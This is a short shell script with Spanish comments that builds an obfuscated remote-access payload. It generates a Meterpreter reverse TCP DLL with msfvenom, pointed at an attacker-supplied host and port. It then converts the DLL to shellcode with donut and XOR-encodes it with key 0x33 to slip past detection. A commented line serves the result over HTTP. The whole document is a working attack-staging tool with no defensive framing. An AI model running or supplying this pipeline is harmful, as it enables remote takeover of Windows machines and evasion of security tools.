# 1. Generar DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f dll -o payload.dll

# 2. Convertir a PIC con donut
./donut -f 1 -a 2 -b 3 -o payload.pic -i payload.dll
# 3. Ofuscar con XOR 0x33
python3 -c "open('dll.bin','wb').write(bytes([b^0x33 for b in open('payload.pic','rb').read()]))"

# 4. Servir
#python3 -m http.server 80
